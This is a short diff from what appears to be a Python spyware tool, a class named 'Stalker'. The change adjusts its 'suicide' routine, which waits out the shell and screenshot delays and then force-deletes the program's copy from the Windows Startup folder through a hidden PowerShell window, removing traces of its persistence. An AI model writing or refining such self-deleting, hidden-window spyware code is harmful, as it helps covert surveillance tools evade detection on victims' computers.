@@ -64,7 +64,7 @@ class Stalker:
     def suicide(self):
         ps_command = f"""
         Start-Sleep -Seconds {self.ShellDelay_sec + self.ScreenshotsDelay_sec + 15};
-        Remove-Item -Force '{self.ProgramName}'
+        Remove-Item -Force '{self.StartupFolder}\\{self.ProgramName}'
         """
 
         subprocess.Popen(['powershell', '-Command', ps_command], creationflags=subprocess.CREATE_NO_WINDOW)
